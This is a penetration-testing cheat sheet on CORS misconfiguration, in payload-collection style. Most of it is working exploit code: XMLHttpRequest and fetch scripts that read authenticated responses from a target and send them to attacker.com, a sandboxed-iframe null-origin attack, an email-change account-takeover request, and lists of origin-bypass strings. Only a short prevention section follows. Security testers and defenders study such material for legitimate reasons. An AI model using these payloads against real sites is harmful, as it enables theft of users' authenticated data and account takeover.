# CORS Misconfiguration

## Description
Cross-Origin Resource Sharing (CORS) is a mechanism that allows restricted resources on a web page to be requested from another domain. Misconfigurations in CORS policies can allow attackers to make authenticated requests on behalf of victims and steal sensitive data.

## How CORS Works

### Request Headers
```http
Origin: https://attacker.com
```

### Response Headers
```http
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type
Access-Control-Expose-Headers: X-Custom-Header
```

## Vulnerability Types

### 1. Origin Reflection
Server reflects any Origin header back in Access-Control-Allow-Origin.

**Detection:**
```http
GET /api/sensitive HTTP/1.1
Host: target.com
Origin: https://attacker.com

Response:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

**Exploit:**
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    location = 'https://attacker.com/steal?data=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://target.com/api/sensitive', true);
req.withCredentials = true;
req.send();
</script>
```

### 2. Null Origin Exploitation
Server accepts `null` as a valid origin.

**Detection:**
```http
GET /api/sensitive HTTP/1.1
Host: target.com
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploit (using iframe sandbox):**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    location = 'https://attacker.com/steal?data=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://target.com/api/sensitive', true);
req.withCredentials = true;
req.send();
</script>
"></iframe>
```

### 3. Regex Bypass

#### Weak Prefix Validation
```
Allowed: *.target.com
Bypass: attackertarget.com
```

#### Weak Suffix Validation
```
Allowed: target.com*
Bypass: target.com.attacker.com
```

#### Missing Escape in Regex
```
Allowed: target.com (intended as target\.com)
Bypass: targetXcom.attacker.com
```

**Test Origins:**
```
https://target.com.attacker.com
https://attackertarget.com
https://target.com.evil.com
https://targetacom (if . not escaped)
https://target.com%60.attacker.com
https://target.com%0d%0a.attacker.com
```

### 4. XSS on Trusted Origin
If a whitelisted domain has XSS vulnerability:

```javascript
// On trusted-subdomain.target.com with XSS
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    location = 'https://attacker.com/steal?data=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://api.target.com/sensitive', true);
req.withCredentials = true;
req.send();
</script>
```

### 5. Wildcard Origin Without Credentials
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: false
```

**Impact:** Limited, but can be used for:
- Internal network pivoting
- Information disclosure of non-credentialed endpoints

### 6. Pre-flight Bypass
Bypass OPTIONS request restrictions by using simple requests:

```http
# Simple request (no preflight)
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
```

## Exploitation Techniques

### Basic Steal Data
```html
<!DOCTYPE html>
<html>
<body>
<script>
function cors() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            document.getElementById("result").innerHTML = this.responseText;
            // Exfiltrate
            new Image().src = "https://attacker.com/log?data=" + btoa(this.responseText);
        }
    };
    xhr.open("GET", "https://target.com/api/user", true);
    xhr.withCredentials = true;
    xhr.send();
}
cors();
</script>
<div id="result"></div>
</body>
</html>
```

### Fetch API Exploit
```javascript
fetch('https://target.com/api/sensitive', {
    credentials: 'include'
})
.then(response => response.text())
.then(data => {
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: data
    });
});
```

### State-Changing Request
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/change-email", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({email: "attacker@evil.com"}));
</script>
```

## Detection Tools

### Corsy
```bash
python3 corsy.py -u https://target.com/api/user
```

### CORScanner
```bash
python cors_scan.py -u https://target.com
```

### Manual Testing with curl
```bash
# Test origin reflection
curl -H "Origin: https://attacker.com" -I https://target.com/api/user

# Test null origin
curl -H "Origin: null" -I https://target.com/api/user

# Test subdomain
curl -H "Origin: https://evil.target.com" -I https://target.com/api/user
```

### Burp Suite
1. Add target to scope
2. Use Burp's CORS scanner
3. Manually test with Repeater

## Bypass Techniques

### URL Encoding
```
https://target.com%2f%2f.attacker.com
https://target.com%252f.attacker.com
```

### Special Characters
```
https://target.com`.attacker.com
https://target.com'.attacker.com
https://target.com!.attacker.com
https://target.com$.attacker.com
```

### Unicode Normalization
```
https://target.com。attacker.com (Unicode period)
```

### Parser Differential
```
https://target.com#.attacker.com
https://target.com?.attacker.com
https://target.com\.attacker.com
```

## Impact Assessment

### High Impact
- Authenticated data theft
- Account takeover
- State-changing actions on behalf of user

### Medium Impact
- Information disclosure
- Internal network scanning

### Low Impact
- Public data access
- Non-credentialed endpoints

## Prevention
```
- Strict whitelist of allowed origins
- Never reflect the Origin header dynamically
- Avoid null origin
- Use proper regex escaping
- Don't allow credentials with wildcards
- Validate at server-side, not just client
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- https://portswigger.net/web-security/cors
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
